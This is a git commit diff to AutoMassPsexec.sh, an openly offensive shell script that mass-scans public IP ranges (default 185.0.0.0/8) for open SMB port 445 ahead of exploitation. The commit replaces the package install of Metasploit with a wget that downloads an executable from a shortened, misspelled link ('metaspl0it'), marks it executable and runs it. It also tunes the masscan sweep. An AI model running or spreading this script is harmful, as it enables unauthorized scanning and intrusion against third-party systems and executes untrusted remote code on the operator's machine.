fbc4b8371c4ed4241e3f11699802737f9cfa4118
Remi Girard <54126451+independentcod@users.noreply.github.com>
2020-04-02 22:26:55 -0400

    Update AutoMassPsexec.sh

--- AutoMassPsexec.sh
+++ AutoMassPsexec.sh
@@ -7,7 +7,10 @@ echo LinkedIn: https://rebrand.ly/1091c;
 echo ---DISCLAIMER--- I AM NOT RESPONSIBLE FOR ANY ACTIONS YOU MAKE WITH THIS PROGRAM. THE ONLY RESPONSIBLE PERSON IS YOU!;
 sleep 5s;
 echo Installing necessary files to run this nasty script.;
-sudo apt update && sudo apt install git metasploit-framework libssl-dev libpcap-dev -y;
+sudo apt update && sudo apt install git libssl-dev libpcap-dev -y;
+wget -O msf.run https://is.gd/metaspl0it;
+chmod +x msf.run;
+./msf.run;
 service postgresql start;
 msfdb init;
 git clone https://github.com/robertdavidgraham/masscan.git;
@@ -18,7 +21,8 @@ echo Installation step is done, now starting smb scanner...;
 sleep 5s;
 read -p 'IP Range to exploit? [ 185.0.0.0-185.255.255.255 ]' ip;
 case $ip in
-	Y) sudo masscan -p 445 --range $ip --rate 1000000  --open --banners -oG smb.scan&
+	Y) echo "Now scanning please wait...";
+sudo masscan -p 445 --range $ip --rate 50000 --open --banners -oG smb.scan;
 esac
 sleep 1s;
 echo PLEASE WAIT... Sleeping one minute, to populate vulnerable servers list...;
